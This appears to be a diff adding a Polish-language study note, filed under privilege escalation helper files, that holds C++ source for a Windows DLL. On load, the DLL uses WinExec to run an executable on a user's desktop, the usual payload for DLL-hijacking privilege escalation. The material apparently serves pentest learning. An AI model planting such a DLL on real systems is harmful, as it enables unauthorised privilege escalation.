@@ -1,0 +1,33 @@
+---
+title: "KimJestem DLL"
+folder: "06. Privilege Escalation/Pliki Pomocnicze"
+---
+
+
+
+#include "pch.h"
+#include <stdio.h>
+#include <windows.h>
+#include <fstream>
+#include <Windows.h>
+#include <cstdlib> // Do użycia funkcji system
+#include <sstream>
+
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  ul_reason_for_call,
+    LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        // Wywołaj funkcję wykonującą polecenie
+        WinExec("C:\\Users\\User\\Desktop\\Nowekimjestem.exe", SW_SHOWNORMAL);
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
